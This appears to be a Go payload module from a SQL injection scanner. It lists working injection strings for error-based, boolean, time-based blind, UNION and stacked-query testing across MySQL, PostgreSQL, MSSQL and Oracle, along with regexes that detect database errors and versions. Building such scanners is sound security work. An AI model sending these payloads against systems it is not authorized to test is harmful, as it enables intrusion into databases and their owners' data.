package payloads

import (
	"strings"
)

// --- Struct Definitions for Different SQLi Techniques ---

// BooleanSQLiTest represents a single test case for Boolean-Based SQLi.
type BooleanSQLiTest struct {
	TruePayload  string
	FalsePayload string
	Description  string
}

// TimeBasedSQLiTest represents a single test case for Time-Based Blind SQLi.
type TimeBasedSQLiTest struct {
	// PayloadTemplate contains a {DELAY} placeholder for the sleep duration.
	PayloadTemplate string
	Description     string
	// DBMS specifies the target database system (e.g., "MySQL", "PostgreSQL", "MSSQL", "Oracle").
	DBMS string
}

// --- Payload & Pattern Variables ---

// SQLiPayloads are simple strings designed to trigger database errors. (Name reverted to original)
var SQLiPayloads []string

// SQLiErrorPatterns are regex patterns to detect database errors in responses.
var SQLiErrorPatterns []string

// BooleanSQLiTests contains test cases for Boolean-Based SQLi.
var BooleanSQLiTests []BooleanSQLiTest

// TimeBasedSQLiTests contains test cases for Time-Based Blind SQLi.
var TimeBasedSQLiTests []TimeBasedSQLiTest

// UnionSQLiPayloadTemplates contains templates for UNION-based SQLi.
// The scanner's engine should replace {NULLS} with the correct number of NULL columns.
var UnionSQLiPayloadTemplates []string

// StackedQueriesSQLiPayloads contains payloads for testing stacked query injection.
var StackedQueriesSQLiPayloads []string

// SQLiVersionRegexes are regex patterns to extract DB versions from error messages.
var SQLiVersionRegexes []string

// ContentBasedSQLiPayloads contains payloads designed to reveal additional content.
var ContentBasedSQLiPayloads []string

// --- Initialization ---

func init() {
	// --- Error-Based Payloads & Patterns ---
	// Name reverted to original to fix the undefined error in the scanner.
	SQLiPayloads = []string{
		"'", "\"", "`", "');", "';", "))", "OR 1=1", "--", "/*", "#",
	}

	SQLiErrorPatterns = []string{
		`(?i)you have an error in your sql syntax`, `(?i)warning: mysql_fetch_array()`,
		`(?i)unclosed quotation mark after the character string`, `(?i)incorrect syntax near`,
		`(?i)ora-[0-9]{5}:`, `(?i)psycopg2\.errors\.syntaxerror`, `(?i)sqlite3\.sqliteexception`,
		`(?i)Uncaught PDOException:`, `(?i)unrecognized token:`, `(?i)supplied argument is not a valid`,
		`(?i)Microsoft OLE DB Provider for SQL Server`, `(?i)OLE DB provider "SQLNCLI"`,
	}

	SQLiVersionRegexes = []string{
		`MySQL\sversion\s(?:V[0-9\.]+\s|)([\d\.]+)`,
		`MariaDB\sversion\s([\d\.]+)`,
		`PostgreSQL\s(?:[^\s]*?)\s([\d\.]+)`,
		`Oracle\sDatabase\s(?:Release|Server)\s([\d\.]+)`,
		`Microsoft\sSQL\sServer\s(?:\[\w+\].*?)\s([\d\.]+)`,
		`(\d{1,2}\.\d{1,2}\.\d{1,2})[^.]*?for\sLinux`,
	}

	// --- Boolean-Based Payloads ---
	BooleanSQLiTests = []BooleanSQLiTest{
		{
			TruePayload:  "' OR '1'='1",
			FalsePayload: "' AND '1'='2",
			Description:  "String context with single quotes",
		},
		{
			TruePayload:  "\" OR \"1\"=\"1",
			FalsePayload: "\" AND \"1\"=\"2",
			Description:  "String context with double quotes",
		},
		{
			TruePayload:  "' OR 1=1 -- -",
			FalsePayload: "' AND 1=2 -- -",
			Description:  "String context with comment",
		},
		{
			TruePayload:  ") OR ('1'='1",
			FalsePayload: ") AND ('1'='2",
			Description:  "Parenthesis with single quotes",
		},
		{
			TruePayload:  " OR 1=1",
			FalsePayload: " AND 1=2",
			Description:  "Numeric context",
		},
		{
			TruePayload:  " OR 1=1 -- -",
			FalsePayload: " AND 1=2 -- -",
			Description:  "Numeric context with comment",
		},
	}

	// --- Time-Based Blind Payloads ---
	TimeBasedSQLiTests = []TimeBasedSQLiTest{
		{PayloadTemplate: "AND SLEEP({DELAY})", Description: "MySQL/MariaDB time-based", DBMS: "MySQL"},
		{PayloadTemplate: "OR SLEEP({DELAY})", Description: "MySQL/MariaDB time-based", DBMS: "MySQL"},
		{PayloadTemplate: "' AND SLEEP({DELAY}) AND '1'='1", Description: "MySQL/MariaDB string time-based", DBMS: "MySQL"},
		{PayloadTemplate: "AND pg_sleep({DELAY})", Description: "PostgreSQL time-based", DBMS: "PostgreSQL"},
		{PayloadTemplate: "' AND pg_sleep({DELAY}) -- -", Description: "PostgreSQL string time-based", DBMS: "PostgreSQL"},
		{PayloadTemplate: "; WAITFOR DELAY '0:0:{DELAY}'", Description: "MSSQL time-based", DBMS: "MSSQL"},
		{PayloadTemplate: "''; WAITFOR DELAY '0:0:{DELAY}'", Description: "MSSQL string time-based", DBMS: "MSSQL"},
		{PayloadTemplate: "AND (SELECT 2 FROM (SELECT(SLEEP({DELAY})))a)", Description: "MySQL/MariaDB complex time-based", DBMS: "MySQL"},
		{PayloadTemplate: "AND 1=dbms_pipe.receive_message('a',{DELAY})", Description: "Oracle time-based", DBMS: "Oracle"},
	}

	// --- UNION-Based Payload Templates ---
	UnionSQLiPayloadTemplates = []string{
		" UNION SELECT {NULLS}",
		"' UNION SELECT {NULLS}--",
		"\" UNION SELECT {NULLS}--",
		"') UNION SELECT {NULLS}--",
		"\") UNION SELECT {NULLS}--",
	}

	// --- Stacked Queries Payloads ---
	StackedQueriesSQLiPayloads = []string{
		"; SELECT pg_sleep(10) --", // PostgreSQL
		"'; SELECT pg_sleep(10) --",
		"; WAITFOR DELAY '0:0:10' --", // MSSQL
		"'; WAITFOR DELAY '0:0:10' --",
	}

	// --- Content-Based Payloads ---
	ContentBasedSQLiPayloads = []string{
		"' OR 1=1--",
		"\" OR 1=1--",
		" OR 1=1--",
		"') OR 1=1--",
		"\") OR 1=1--",
	}

	// Menambahkan pola untuk deteksi versi Oracle
	SQLiVersionRegexes = append(SQLiVersionRegexes, `Oracle Database .* Release ([\d\.]+)`)
}

// IsIgnoredParam checks if a parameter should be ignored for SQLi testing
func IsIgnoredParam(paramName string) bool {
	ignoredParams := map[string]bool{
		"_csrf_token": true,
		"csrf_token":  true,
		"csrf":        true,
		"token":       true,
		"session_id":  true,
		"session":     true,
		"__cfduid":    true,
	}
	return ignoredParams[strings.ToLower(paramName)]
}

// IsSQLResponse checks if the response contains SQL error messages
func IsSQLResponse(body string) bool {
	sqlErrors := []string{
		"SQL error",
		"syntax error",
		"unexpected token",
		"unrecognized token",
		"near \"'\" at line",
		"You have an error in your SQL syntax",
		// "Warning:", // Dihapus karena terlalu umum dan menyebabkan false positive
	}

	body = strings.ToLower(body)
	for _, err := range sqlErrors {
		if strings.Contains(body, strings.ToLower(err)) {
			return true
		}
	}
	return false
}

// InferDBType infers the database type from an error message.
func InferDBType(errorEvidence string) string {
	lowerEvidence := strings.ToLower(errorEvidence)
	if strings.Contains(lowerEvidence, "mysql") || strings.Contains(lowerEvidence, "mariadb") {
		return "MySQL"
	}
	if strings.Contains(lowerEvidence, "ora-") || strings.Contains(lowerEvidence, "oracle") {
		return "Oracle"
	}
	if strings.Contains(lowerEvidence, "postgre") || strings.Contains(lowerEvidence, "pg_") {
		return "PostgreSQL"
	}
	if strings.Contains(lowerEvidence, "mssql") || strings.Contains(lowerEvidence, "sql server") || strings.Contains(lowerEvidence, "oledb") {
		return "MSSQL"
	}
	if strings.Contains(lowerEvidence, "sqlite") {
		return "SQLite"
	}
	if strings.Contains(lowerEvidence, "unrecognized token") || strings.Contains(lowerEvidence, "pdoexception") {
		return "Generic/PDO"
	}
	return "Unknown"
}
